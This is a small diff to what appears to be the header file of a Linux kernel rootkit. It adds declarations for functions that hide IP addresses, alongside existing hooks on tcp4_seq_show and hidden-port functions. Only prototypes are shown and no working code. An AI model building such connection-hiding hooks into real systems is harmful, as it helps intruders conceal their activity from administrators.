@@ -10,6 +10,10 @@
 asmlinkage long malw_tcp4_seq_show(struct seq_file *, void *);
 void install_tcp_seq_show_hook(void);
 void remove_tcp_seq_show_hook(void);
+
+void add_hidden_ip(char *);
+void remove_hidden_ip(char *);
+
 void add_hidden_port(int);
 void remove_hidden_port(int);
 
